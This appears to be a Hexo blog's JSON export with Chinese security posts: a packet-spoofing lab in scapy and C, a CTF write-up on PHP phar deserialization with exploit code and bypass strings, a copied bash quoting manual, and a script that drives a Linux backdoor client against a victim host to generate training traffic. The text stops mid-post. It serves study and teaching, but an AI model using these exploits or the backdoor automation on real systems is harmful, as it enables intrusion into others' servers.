{"meta":{"title":"Sayingの魔法书","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2021-06-04T02:50:49.426Z","updated":"2021-06-04T02:50:49.426Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"下面写关于自己的内容"},{"title":"","date":"2021-06-05T17:25:12.347Z","updated":"2021-06-05T17:25:12.347Z","comments":false,"path":"artitalk/index.html","permalink":"http://example.com/artitalk/index.html","excerpt":"","text":""},{"title":"","date":"2021-06-04T03:07:41.197Z","updated":"2021-06-04T03:07:41.197Z","comments":true,"path":"404.html","permalink":"http://example.com/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"所有分类","date":"2021-06-04T03:03:13.389Z","updated":"2021-06-04T03:03:13.389Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2021-06-04T03:51:13.880Z","updated":"2021-06-04T03:51:13.880Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":""},{"title":"","date":"2021-06-04T03:04:01.024Z","updated":"2021-06-04T03:04:01.024Z","comments":true,"path":"mylist/index.html","permalink":"http://example.com/mylist/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2021-06-04T03:03:46.546Z","updated":"2021-06-04T03:03:46.546Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"网络攻防实践(二)第6、7次实验","slug":"网络攻防实践-二-第6、7次实验","date":"2021-06-06T05:03:23.000Z","updated":"2021-06-06T06:36:23.161Z","comments":true,"path":"2021/06/06/网络攻防实践-二-第6、7次实验/","link":"","permalink":"http://example.com/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5-%E4%BA%8C-%E7%AC%AC6%E3%80%817%E6%AC%A1%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"网络攻防实践(二)第6、7次实验垃圾攻防实践毁我青春 经历了前几次极其无聊的攻防实践尤其是垃圾渗透测试，终于到了这次算是我较为感兴趣的攻防实践——嗅探与伪造/ARP缓存中毒。碰巧这几天重构了自己的博客，顺手写进博客 一、嗅探与伪造1.1 scapy路由追踪目的是scapy实现路由追踪。实际上，有关路由追踪的常见方式有两种： linux/BSD/router/UNIX下的traceroute。向目的地址的某个端口（大于30000）发送UDP数据报。 windows下的tracert。向目的地址发送icmp回显请求数据报。 当然本质上都是设置ttl=1发包，然后逐次增加ttl。通过接受到的icmp超时报文，获取路径上节点的ip地址。 指导书要求使用icmp回显请求数据报。 123456789101112131415161718192021222324252627282930import argparsefrom scapy.all import *# MAX_TTL = 64MAX_TTL = 32def ping_once(dst, ttl): pkt = IP(dst=dst, ttl=ttl) / ICMP(type=8) trace_reply = sr1(pkt, retry = 1, timeout = 7) if trace_reply is None: return &quot;请求超时&quot; return trace_reply[&#x27;IP&#x27;].srcdef tracert(dst): res = &#x27;&#x27; for ttl in range(1, MAX_TTL + 1): src = ping_once(dst, ttl) ans = &quot;&#123;&#125;: &#123;:^20&#125;&quot;.format(ttl, src) print(ans) res += ans + &#x27;\\n&#x27; if src == dst: break return resif __name__ == &#x27;__main__&#x27;: parser = argparse.ArgumentParser(description=&quot;traceroute&quot;) parser.add_argument(&quot;dst&quot;, help=&quot;destination ip&quot;) args = parser.parse_args() print(tracert(args.dst)) 可能有某些节点禁ping，或者是什么其他安全措施，导致请求超时，这是正常的。即使使用Windows自带的tracert也会出现这种情况 1.2 伪造icmp响应报文目的是对嗅探的任意icmp请求报文做出回应，即使目标不是自己。这样，如果网络正常，目标主机在ping命令时，每发出一个icmp echo request，将收到两个icmp echo reply。 直接上代码吧（ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143#include &lt;pcap.h&gt; #include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;#include &quot;myheader.h&quot;void reply_icmp_pkt(struct ipheader *ip, struct icmpheader *icmp);unsigned short in_cksum(unsigned short *buf,int length);void send_raw_ip_packet(struct ipheader* ip);void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) &#123; struct ethheader *eth=(struct ethheader *)packet; if(ntohs(eth-&gt;ether_type) == 0x800) &#123; struct ipheader *ip = (struct ipheader *)(packet + sizeof(struct ethheader)); if (ip-&gt;iph_protocol == IPPROTO_ICMP) &#123; printf(&quot;Got an ICMP packet\\n&quot;); printf(&quot; From: %s\\n&quot;,inet_ntoa(ip-&gt;iph_sourceip)); printf(&quot; To: %s\\n&quot;,inet_ntoa(ip-&gt;iph_destip)); struct icmpheader *icmp = (struct icmpheader *)(packet + sizeof(struct ethheader) + sizeof(struct ipheader)); if (icmp-&gt;icmp_type == 8) &#123; reply_icmp_pkt(ip, icmp); &#125; &#125; &#125;&#125;int main()&#123; pcap_t *handle; char errbuf[PCAP_ERRBUF_SIZE]; struct bpf_program fp; char filter_exp[] = &quot;ip proto icmp&quot;; bpf_u_int32 net; // Step 1: Open live pcap session on NIC with interface name handle = pcap_open_live(&quot;docker0&quot;, BUFSIZ, 1, 1000, errbuf); // Step 2: Compile filter_exp into BPF psuedo-code pcap_compile(handle, &amp;fp, filter_exp, 0, net); pcap_setfilter(handle, &amp;fp); // Step 3: Capture packets pcap_loop(handle, -1, got_packet, NULL); pcap_close(handle); //Close the handle return 0;&#125;void reply_icmp_pkt(struct ipheader *ip, struct icmpheader *icmp) &#123; char buffer[PACKET_LEN]; memset(buffer, 0, PACKET_LEN); struct icmpheader *reply_icmp; reply_icmp = (struct icmpheader *)(buffer + sizeof(struct ipheader)); struct ipheader *reply_ip; reply_ip = (struct ipheader *) buffer; int icmp_len = ntohs(ip-&gt;iph_len) - sizeof(struct ipheader); memcpy(reply_icmp, icmp, icmp_len); reply_icmp-&gt;icmp_type = 0; reply_icmp-&gt;icmp_chksum = 0; void *temp = reply_icmp; reply_icmp-&gt;icmp_chksum = in_cksum(temp, icmp_len); reply_ip-&gt;iph_ver = 4; reply_ip-&gt;iph_ihl = 5; reply_ip-&gt;iph_tos = 16; reply_ip-&gt;iph_ident = htons(54321); reply_ip-&gt;iph_ttl = 64; reply_ip-&gt;iph_sourceip.s_addr = ip-&gt;iph_destip.s_addr; reply_ip-&gt;iph_destip.s_addr = ip-&gt;iph_sourceip.s_addr; reply_ip-&gt;iph_protocol = IPPROTO_ICMP; // The value is 1, representing ICMP. reply_ip-&gt;iph_len = htons(sizeof(struct ipheader) + icmp_len); send_raw_ip_packet(reply_ip); return;&#125;unsigned short in_cksum(unsigned short *buf,int length)&#123; unsigned short *w = buf; int nleft = length; int sum = 0; unsigned short temp=0; /* * The algorithm uses a 32 bit accumulator (sum), adds * sequential 16 bit words to it, and at the end, folds back all the * carry bits from the top 16 bits into the lower 16 bits. */ while (nleft &gt; 1) &#123; sum += *w++; nleft -= 2; &#125; /* treat the odd byte at the end, if any */ if (nleft == 1) &#123; *(u_char *)(&amp;temp) = *(u_char *)w ; sum += temp; &#125; /* add back carry outs from top 16 bits to low 16 bits */ sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff); // add hi 16 to low 16 sum += (sum &gt;&gt; 16); // add carry return (unsigned short)(~sum);&#125;/******************************************************************************* Given an IP packet, send it out using raw socket. *******************************************************************************/void send_raw_ip_packet(struct ipheader* ip)&#123; struct sockaddr_in dest_info; int enable = 1; // Create a raw network socket, and set its options. int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &amp;enable, sizeof(enable)); // Provide needed information about destination. dest_info.sin_family = AF_INET; dest_info.sin_addr = ip-&gt;iph_destip; // Send the packet out. printf(&quot;Sending spoofed IP packet...\\n&quot;); if(sendto(sock,ip,ntohs(ip-&gt;iph_len),0,(struct sockaddr *)&amp;dest_info,sizeof(dest_info)) &lt; 0) &#123; perror(&quot;PACKET NOT SENT\\n&quot;); return; &#125; else &#123; printf(&quot;\\n---------------------------------------------------\\n&quot;); printf(&quot; From: %s\\n&quot;,inet_ntoa(ip-&gt;iph_sourceip)); printf(&quot; To: %s\\n&quot;,inet_ntoa(ip-&gt;iph_destip)); printf(&quot;\\n---------------------------------------------------\\n&quot;); &#125; close(sock);&#125; 需要头文件： 头文件myheader.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596/* ethernet headers are always exactly 14 bytes [1] */#define SIZE_ETHERNET 14/* Ethernet addresses are 6 bytes */#define ETHER_ADDR_LEN 6#define PACKET_LEN 1500/* Ethernet header */struct ethheader &#123; u_char ether_dhost[ETHER_ADDR_LEN]; /* destination host address */ u_char ether_shost[ETHER_ADDR_LEN]; /* source host address */ u_short ether_type; /* IP? ARP? RARP? etc */&#125;;/* IP Header */struct ipheader &#123; unsigned char iph_ihl:4, iph_ver:4; //IP Header length &amp; Version. unsigned char iph_tos; //Type of service unsigned short int iph_len; //IP Packet length (Both data and header) unsigned short int iph_ident; //Identification unsigned short int iph_flag:3, iph_offset:13; //Flags and Fragmentation offset unsigned char iph_ttl; //Time to Live unsigned char iph_protocol; //Type of the upper-level protocol unsigned short int iph_chksum; //IP datagram checksum struct in_addr iph_sourceip; //IP Source address (In network byte order) struct in_addr iph_destip;//IP Destination address (In network byte order)&#125;;/* ICMP Header */struct icmpheader &#123; unsigned char icmp_type; //ICMP message type unsigned char icmp_code; //Error code unsigned short int icmp_chksum; //Checksum for ICMP Header and data unsigned short int icmp_id; //Used in echo request/reply to identify request unsigned short int icmp_seq;//Identifies the sequence of echo messages, //if more than one is sent.&#125;;/* TCP Header */struct tcpheader &#123; u_short tcp_sport; /* source port */ u_short tcp_dport; /* destination port */ u_int tcp_seq; /* sequence number */ u_int tcp_ack; /* acknowledgement number */ u_char tcp_offx2; /* data offset, rsvd */#define TH_OFF(th) (((th)-&gt;tcp_offx2 &amp; 0xf0) &gt;&gt; 4) u_char tcp_flags;#define TH_FIN 0x01#define TH_SYN 0x02#define TH_RST 0x04#define TH_PUSH 0x08#define TH_ACK 0x10#define TH_URG 0x20#define TH_ECE 0x40#define TH_CWR 0x80#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR) u_short tcp_win; /* window */ u_short tcp_sum; /* checksum */ u_short tcp_urp; /* urgent pointer */&#125;;/* UDP Header */struct udpheader&#123; u_int16_t udp_sport; /* source port */ u_int16_t udp_dport; /* destination port */ u_int16_t udp_ulen; /* udp length */ u_int16_t udp_sum; /* udp checksum */&#125;;struct pseudo_tcp&#123; unsigned saddr, daddr; unsigned char mbz; unsigned char ptcl; unsigned short tcpl; struct tcpheader tcp; char payload[PACKET_LEN];&#125;;// DNS layer header&#x27;s structurestruct dnsheader &#123; unsigned short int query_id; unsigned short int flags; unsigned short int QDCOUNT; unsigned short int ANCOUNT; unsigned short int NSCOUNT; unsigned short int ARCOUNT;&#125;; 二、ARP缓存中毒待完成……","categories":[],"tags":[{"name":"嗅探","slug":"嗅探","permalink":"http://example.com/tags/%E5%97%85%E6%8E%A2/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"C","slug":"C","permalink":"http://example.com/tags/C/"}],"author":"saying"},{"title":"PHP stream wrapper","slug":"PHP_stream_wrapper","date":"2021-01-26T07:30:11.000Z","updated":"2021-06-06T06:34:10.270Z","comments":true,"path":"2021/01/26/PHP_stream_wrapper/","link":"","permalink":"http://example.com/2021/01/26/PHP_stream_wrapper/","excerpt":"","text":"PHP stream wrapper机制相关题目的分析整理一、流和包装器简介**流(stream)**是在PHP 4.3.0中引入的，作为一种通用文件、网络、数据压缩和其他操作的方式，这些操作共享一组共同的函数和用途。在其最简单的定义中，流是一种表现出流行为的资源对象。 每一种流都实现了一个**包装器(wrapper)**，包装器包含一些额外的代码用来处理特殊的协议和编码。PHP提供了一些内置的包装器。 引用流的格式如下： 1&lt;scheme&gt;://&lt;target&gt; 其中，&lt;schema&gt;为包装器的名称，如file，http，https，ftp，compress.zlib，php等。可以用stream_get_wrappers()函数查看内置的所有包装器。 12345678910111213141516171819202122array(10) &#123; [0]=&gt; string(5) &quot;https&quot; [1]=&gt; string(4) &quot;ftps&quot; [2]=&gt; string(13) &quot;compress.zlib&quot; [3]=&gt; string(3) &quot;php&quot; [4]=&gt; string(4) &quot;file&quot; [5]=&gt; string(4) &quot;glob&quot; [6]=&gt; string(4) &quot;data&quot; [7]=&gt; string(4) &quot;http&quot; [8]=&gt; string(3) &quot;ftp&quot; [9]=&gt; string(4) &quot;phar&quot;&#125; &lt;target&gt;取决于所使用的包装器。如对于文件系统相关的流&lt;target&gt;通常是所需文件的文件路径和文件名；对于网络相关的流，&lt;target&gt;通常是目标的主机名和路径。 例如，可以使用file_get_contents()打开多种数据流。 123456789&lt;?phpvar_dump(file_get_contents(&#x27;/etc/passwd&#x27;));//打开本地文件var_dump(file_get_contents(&#x27;http://www.baidu.com&#x27;));//访问网络页面var_dump(file_get_contents(&#x27;data:test/plain,coooool!&#x27;));//打开data url 二、Phar反序列化在2018年的Black Hat大会上，安全研究员Sam Thomas分享了议题It’s a PHP unserialization vulnerability Jim, but not as we know it，指出通过phar://协议对一个phar文件进行操作，可能导致触发反序列化漏洞。 PHAR(PHp ARchive)是php中的打包文件，类似于java语言的jar打包文件。 可以看到倒数第二行，Meta-data以序列化格式存储。因此php的文件系统函数在通过phar://协议解析phar时，也需要对meta-data进行反序列化。因此可能触发反序列化漏洞。 受影响函数列表： 一些绕过方法 绕过文件格式的匹配：在文件头加上GIF89a 123456789101112&lt;?class test&#123; public $name = &#x27;xxx&#x27;;&#125;$o = new test();$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub开头为GIF89a$phar-&gt;setMetadata($o); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); 编码绕过、大小写绕过等 123$file = &quot;PhAr://&quot; . __DIR__ . &#x27;/phar.phar&#x27;;$file = &quot;\\x70har\\x3a//&quot; . __DIR__ . &#x27;/phar.phar&#x27;;$file = &#x27;php://filter/read=convert.base64-encode/resource=phar://&#x27; . __DIR__ . &#x27;/phar.phar&#x27;; 三、题目（1）HITCON 2016 babytrick这个似乎与stream或wrapper无关，只是顺带 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119&lt;?phpinclude &quot;config.php&quot;;class HITCON&#123; private $method; private $args; private $conn; public function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; $this-&gt;__conn(); &#125; function show() &#123; list($username) = func_get_args(); $sql = sprintf(&quot;SELECT * FROM users WHERE username=&#x27;%s&#x27;&quot;, $username); $obj = $this-&gt;__query($sql); if ( $obj != false ) &#123; $this-&gt;__die( sprintf(&quot;%s is %s&quot;, $obj-&gt;username, $obj-&gt;role) ); &#125; else &#123; $this-&gt;__die(&quot;Nobody Nobody But You!&quot;); &#125; &#125; function login() &#123; global $FLAG; list($username, $password) = func_get_args(); $username = strtolower(trim(mysql_escape_string($username))); $password = strtolower(trim(mysql_escape_string($password))); $sql = sprintf(&quot;SELECT * FROM users WHERE username=&#x27;%s&#x27; AND password=&#x27;%s&#x27;&quot;, $username, $password); if ( $username == &#x27;orange&#x27; || stripos($sql, &#x27;orange&#x27;) != false ) &#123; $this-&gt;__die(&quot;Orange is so shy. He do not want to see you.&quot;); &#125; $obj = $this-&gt;__query($sql); if ( $obj != false &amp;&amp; $obj-&gt;role == &#x27;admin&#x27; ) &#123; $this-&gt;__die(&quot;Hi, Orange! Here is your flag: &quot; . $FLAG); &#125; else &#123; $this-&gt;__die(&quot;Admin only!&quot;); &#125; &#125; function source() &#123; highlight_file(__FILE__); &#125; function __conn() &#123; global $db_host, $db_name, $db_user, $db_pass, $DEBUG; if (!$this-&gt;conn) $this-&gt;conn = mysql_connect($db_host, $db_user, $db_pass); mysql_select_db($db_name, $this-&gt;conn); if ($DEBUG) &#123; $sql = &quot;CREATE TABLE IF NOT EXISTS users ( username VARCHAR(64), password VARCHAR(64), role VARCHAR(64) ) CHARACTER SET utf8&quot;; $this-&gt;__query($sql, $back=false); $sql = &quot;INSERT INTO users VALUES (&#x27;orange&#x27;, &#x27;$db_pass&#x27;, &#x27;admin&#x27;), (&#x27;phddaa&#x27;, &#x27;ddaa&#x27;, &#x27;user&#x27;)&quot;; $this-&gt;__query($sql, $back=false); &#125; mysql_query(&quot;SET names utf8&quot;); mysql_query(&quot;SET sql_mode = &#x27;strict_all_tables&#x27;&quot;); &#125; function __query($sql, $back=true) &#123; $result = @mysql_query($sql); if ($back) &#123; return @mysql_fetch_object($result); &#125; &#125; function __die($msg) &#123; $this-&gt;__close(); header(&quot;Content-Type: application/json&quot;); die( json_encode( array(&quot;msg&quot;=&gt; $msg) ) ); &#125; function __close() &#123; mysql_close($this-&gt;conn); &#125; function __destruct() &#123; $this-&gt;__conn(); if (in_array($this-&gt;method, array(&quot;show&quot;, &quot;login&quot;, &quot;source&quot;))) &#123; @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; else &#123; $this-&gt;__die(&quot;What do you do?&quot;); &#125; $this-&gt;__close(); &#125; function __wakeup() &#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v))); &#125; &#125;&#125;if(isset($_GET[&quot;data&quot;])) &#123; @unserialize($_GET[&quot;data&quot;]); &#125; else &#123; new HITCON(&quot;source&quot;, array());&#125; 一道正常的反序列化题目，只有一个HITCON。观察代码可以发现，析构函数会将类的属性args作为参数，执行以属性method为名的方法。而在login()中可以找到输出flag。所以关键在于，登陆时需要以orange账号登录。 然而orange账号的密码是未知的。这里会注意到show()方法。可以利用show()方法在SQL查询时进行SQL注入，查询到账户orange的密码。仅需绕过__wakeup()魔术方法。利用CVE-2016-7124，序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup()的执行，从而使传入的args参数无需经过mysql_escape_string()函数，直接地在login()方法中实现SQL注入。爆出密码。 获得密码后即可用于login()，但是这里仍有限制： 123if ( $username == &#x27;orange&#x27; || stripos($sql, &#x27;orange&#x27;) != false ) &#123; $this-&gt;__die(&quot;Orange is so shy. He do not want to see you.&quot;);&#125; 用户名不能为’orange’，sql语句中不能包含’orange’。 以下内容来自MySql手册： 12345678910使用utf8_general_ci和utf8_unicode_ci两种 校对规则下面的比较相等： Ä = A Ö = O Ü = U两种校对规则之间的区别是，对于utf8_general_ci下面的等式成立： ß = s但是，对于utf8_unicode_ci下面等式成立： ß = ss 因此，username=ORÄNGE时，可以绕过上面的php检测，而sql语句却依然能正常执行。orange账号成功登录，即可得到flag。 （2）HITCON 20171234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php $FLAG = create_function(&quot;&quot;, &#x27;die(`/read_flag`);&#x27;); $SECRET = `/read_secret`; $SANDBOX = &quot;/var/www/data/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($SANDBOX); @chdir($SANDBOX); if (!isset($_COOKIE[&quot;session-data&quot;])) &#123; $data = serialize(new User($SANDBOX)); $hmac = hash_hmac(&quot;sha1&quot;, $data, $SECRET); setcookie(&quot;session-data&quot;, sprintf(&quot;%s-----%s&quot;, $data, $hmac)); &#125; class User &#123; public $avatar; function __construct($path) &#123; $this-&gt;avatar = $path; &#125; &#125; class Admin extends User &#123; function __destruct()&#123; $random = bin2hex(openssl_random_pseudo_bytes(32)); eval(&quot;function my_function_$random() &#123;&quot; .&quot; global \\$FLAG; \\$FLAG();&quot; .&quot;&#125;&quot;); $_GET[&quot;lucky&quot;](); &#125; &#125; function check_session() &#123; global $SECRET; $data = $_COOKIE[&quot;session-data&quot;]; list($data, $hmac) = explode(&quot;-----&quot;, $data, 2); if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) die(&quot;Bye&quot;); if ( !hash_equals(hash_hmac(&quot;sha1&quot;, $data, $SECRET), $hmac) ) die(&quot;Bye Bye&quot;); $data = unserialize($data); if ( !isset($data-&gt;avatar) ) die(&quot;Bye Bye Bye&quot;); return $data-&gt;avatar; &#125; function upload($path) &#123; $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;); if (substr($data, 0, 6) !== &quot;GIF89a&quot;) die(&quot;Fuck off&quot;); file_put_contents($path . &quot;/avatar.gif&quot;, $data); die(&quot;Upload OK&quot;); &#125; function show($path) &#123; if ( !file_exists($path . &quot;/avatar.gif&quot;) ) $path = &quot;/var/www/html&quot;; header(&quot;Content-Type: image/gif&quot;); die(file_get_contents($path . &quot;/avatar.gif&quot;)); &#125; $mode = $_GET[&quot;m&quot;]; if ($mode == &quot;upload&quot;) upload(check_session()); else if ($mode == &quot;show&quot;) show(check_session()); else highlight_file(__FILE__); 可以看到源码中利用create_function()构造了一个匿名函数，直接输出flag。那么重点就在于执行这个匿名函数。类Admin的析构函数中可以执行任意函数，包括在该析构函数中使用eval定义的一个函数。然而该匿名函数的函数名中含有随机字符串，爆破是不可能爆破的，这辈子都不可能。 匿名函数并非没有名字，而是以%00lambda_%d命名，其中%d为数字，表示进程的第%d个匿名函数。可以通过发送大量请求迫使apache服务器开启一个新的进程，这样%d将重置为1。 因此，现在最重要的问题就是如果反序列化调用Admin类的析构函数。很容易找到checksession()中调用了unserialize()函数，但可惜的是这个反序列化函数无法利用，因为伪造cookie，直接修改session-data，会导致hash_equal()验证失败。 但是可以利用phar反序列化。 123456789101112131415&lt;?php class Admin &#123; public $avatar = &#x27;xxx&#x27;;&#125;@unlink(&quot;avatar.phar&quot;);$phar = new Phar(&quot;avatar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$phar-&gt;setMetadata($o); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering();rename(__DIR__ . &#x27;/avatar.phar&#x27;, __DIR__ . &#x27;/avatar.jpg&#x27;);?&gt; 把生成的avatar.jpg放到vps上传。随后只需要通过file_get_contents()，file_put_contents()，或file_exists()之类的文件相关函数，使用phar://这个stream wrapper打开文件。在题目中需要再次利用upload()函数。 1?m=upload&amp;url=phar:///var/www/data/xxx&amp;lucky=%00lambda_1 官方wp有一个fork脚本，用于迫使apache开启新的进程 123456789101112131415161718192021222324252627# coding: UTF-8# Author: orange@chroot.org# import requestsimport socketimport timefrom multiprocessing.dummy import Pool as ThreadPooltry: requests.packages.urllib3.disable_warnings()except: passdef run(i): while 1: HOST = &#x27;xxxxx&#x27; PORT = 80 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) s.sendall(&#x27;GET / HTTP/1.1\\nHost: xxxxx\\nConnection: Keep-Alive\\n\\n&#x27;) # s.close() print &#x27;ok&#x27; time.sleep(0.5)i = 8pool = ThreadPool( i )result = pool.map_async( run, range(i) ).get(0xffff) （3）HITCON 2018（4）hxp ctf 2020 resonator题目源码： 12345&lt;?php$file = $_GET[&#x27;file&#x27;] ?? &#x27;/tmp/file&#x27;;$data = $_GET[&#x27;data&#x27;] ?? &#x27;:)&#x27;;file_put_contents($file, $data);echo file_get_contents($file); 参考链接1、Phar File Format 2、Phar与Stream Wrapper造成PHP RCE的深入挖掘 3、利用 phar 拓展 php 反序列化漏洞攻击面 4、My-CTF-Web-Challenges 5、Mysql中的排序规则utf8_unicode_ci、utf8_general_ci的区别总结","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"bash下的转义","slug":"bash下的转义","date":"2020-12-12T07:34:47.000Z","updated":"2021-06-06T06:10:22.601Z","comments":true,"path":"2020/12/12/bash下的转义/","link":"","permalink":"http://example.com/2020/12/12/bash%E4%B8%8B%E7%9A%84%E8%BD%AC%E4%B9%89/","excerpt":"bash下的转义bash手册如下:没错这篇博客是纯copy手册","text":"bash下的转义bash手册如下:没错这篇博客是纯copy手册 123456789101112131415161718192021222324252627282930313233343536373839404142Quoting: Quoting is used to remove the special meaning of certain characters or words to the shell. Quoting can be used to disable special treatment for special characters, to prevent reserved words from being recognized as such, and to prevent parameter expansion. Each of the metacharacters listed above under DEFINITIONS has special meaning to the shell and must be quoted if it is to represent itself. When the command history expansion facilities are being used (see HISTORY EXPANSION below), the history expansion character, usually !, must be quoted to prevent history expansion. There are three quoting mechanisms: the escape character, single quotes, and double quotes. A non-quoted backslash (\\) is the escape character. It preserves the literal value of the next character that follows, with the exception of &lt;newline&gt;. If a \\&lt;newline&gt; pair appears, and the backslash is not itself quoted, the \\&lt;newline&gt; is treated as a line continuation (that is, it is removed from the input stream and effectively ignored). Enclosing characters in single quotes preserves the literal value of each character within the quotes. A single quote may not occur between single quotes, even when preceded by a backslash. Enclosing characters in double quotes preserves the literal value of all characters within the quotes, with the exception of $, `, \\, and, when history expansion is enabled, !. When the shell is in posix mode, the ! has no special meaning within double quotes, even when history expansion is enabled. The characters $ and ` retain their special meaning within double quotes. The backslash retains its special meaning only when followed by one of the following characters: $, `, &quot;, \\, or &lt;newline&gt;. A double quote may be quoted within double quotes by preceding it with a backslash. If enabled, history expansion will be performed unless an ! appearing in double quotes is escaped using a backslash. The backslash preceding the ! is not removed. The special parameters * and @ have special meaning when in double quotes (see PARAMETERS below). Words of the form $&#x27;string&#x27; are treated specially. The word expands to string, with backslash-escaped characters replaced as specified by the ANSI C standard. Backslash escape sequences, if present, are decoded as follows: \\a alert (bell) \\b backspace \\e \\E an escape character \\f form feed \\n new line \\r carriage return \\t horizontal tab \\v vertical tab \\\\ backslash \\&#x27; single quote \\&quot; double quote \\? question mark \\nnn the eight-bit character whose value is the octal value nnn (one to three digits) \\xHH the eight-bit character whose value is the hexadecimal value HH (one or two hex digits) \\uHHHH the Unicode (ISO/IEC 10646) character whose value is the hexadecimal value HHHH (one to four hex digits) \\UHHHHHHHH the Unicode (ISO/IEC 10646) character whose value is the hexadecimal value HHHHHHHH (one to eight hex digits) \\cx a control-x character The expanded result is single-quoted, as if the dollar sign had not been present. A double-quoted string preceded by a dollar sign ($&quot;string&quot;) will cause the string to be translated according to the current locale. If the current locale is C or POSIX, the dollar sign is ignored. If the string is translated and replaced, the replacement is double-quoted. 使用echo测试时，zsh和bash略有不同。zsh的echo相当于bash的echo -e。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}],"author":"saying"},{"title":"重复执行程序脚本","slug":"重复执行程序脚本","date":"2020-09-08T11:13:29.000Z","updated":"2021-06-06T06:30:33.573Z","comments":true,"path":"2020/09/08/重复执行程序脚本/","link":"","permalink":"http://example.com/2020/09/08/%E9%87%8D%E5%A4%8D%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E8%84%9A%E6%9C%AC/","excerpt":"","text":"在项目组工作的过程中，遇到了一个任务：需要重复执行某程序，生成大量的流量。抓取流量，用于AI的学习。因此需要写脚本不断执行程序。我选择了python语言。 一、（1）dewdropdewdrop是一款linux后门软件。在靶机上运行dewdrop服务器后，就可以在攻击机上运行dewdrop客户端连接上靶机，实现远程控制。 我选择subprocess模块。subprocess模块允许启动一个新进程，并将它连接到标准输入/标准输出/标准错误管道。 1234567891011121314151617181920212223242526import sysimport timeimport subprocessfrom random import choiceif __name__==&quot;__main__&quot;: #check for args, print usage if incorrect if len(sys.argv) != 6: print(&#x27;\\nUsage:\\nrundewdrop.py [victim ip] [victim port] &#x27; &#x27;[Listener ip] [Listener port] [Number of command]\\n&#x27;) sys.exit() dip = sys.argv[1] dport = int(sys.argv[2]) listener_ip = sys.argv[3] listener_port = int(sys.argv[4]) command_number = int(sys.argv[5]) run_command = &#x27;./tipoff -i -r tcp -t &#123;&#125; -p &#123;&#125; -a &#123;&#125; -c &#123;&#125;&#x27;.format(dip, dport, listener_ip, listener_port) p = subprocess.Popen(run_command, stdin=subprocess.PIPE, stdout=None, shell=True) time.sleep(10) with open(&#x27;command.txt&#x27;, &#x27;r&#x27;) as f: command_list = [line.strip() for line in f.readlines()] for i in range(command_number): p.stdin.write(choice(command_list) + &quot;\\n&quot;) time.sleep(0.2) time.sleep(10) 使用方法： 在tipoff同目录下新建一个command.txt文件。文件中每一行为所执行的命令。 运行程序，即可不断随机执行命令。 ```python rundewdrop.py [victim ip] [victim port] [Listener ip] [Listener port] [Number of command] 1234567891011### （2）nopennopen也是一款linux后门软件，使用方法与dewdrop类似。在靶机上运行nopen server后，可以使nopen client远程控制。然而，脚本却艰难重重。#### 1.subprocess模块我的第一选择当然是选择与dewdrop相同的方法，使用了subprocess模块。然而，却遇到了问题。nopen client出现了报错。 error: failed to open global_output_file 12345瞬间懵逼......有趣的是，这个nopen client程序还会骂人，还是骂20遍： What? are you nuts? 1234567891011#### 2.其他重定向方法我还采取了其他重定向输入方法。如&lt;，管道符|，都遇到了一模一样的问题。仿佛只要重定向就会报错。#### 3.寻找原因既然找不到原因，就直接逆向分析......动调调试了很久，找到了报错的关键之处。运行nopen client后，每输入一条命令，都会尝试去运行fdopen函数。 FILE* fdopen(int fildes,const char* mode); 